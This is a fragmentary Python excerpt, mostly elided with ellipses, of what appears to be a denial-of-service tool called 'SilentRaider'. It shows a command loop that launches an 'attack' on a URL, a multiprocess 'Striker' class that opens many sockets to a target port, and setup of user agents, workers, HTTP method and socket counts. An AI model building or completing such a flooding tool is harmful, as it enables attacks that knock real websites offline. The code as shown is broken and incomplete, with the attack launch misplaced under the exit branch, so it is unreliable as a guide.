    ...
    while True:
        try:
            ...
            if cmd.lower() == "exit" or cmd.lower() == "quit":
                ...
                url = cmd.split(" ")[1]
                print(f"{BLUE}Starting attack on {url}...{RESET}")
                # Call the SilentRaider attack function here
                # e.g., silentraider = SilentRaider(url)
                # silentraider.fire()
            else:
...
class Striker(Process):
    ...
    def __init__(self, url, nr_sockets, counter):
        ...
        self.port = parsedUrl.port or (80 if not self.ssl else 443)
...
def main():
    ...
    try:
        ...
        silentraider = SilentRaider(url)
        silentraider.useragents = useragents
        silentraider.nr_workers = workers
        silentraider.method = method
        silentraider.nr_sockets = socks
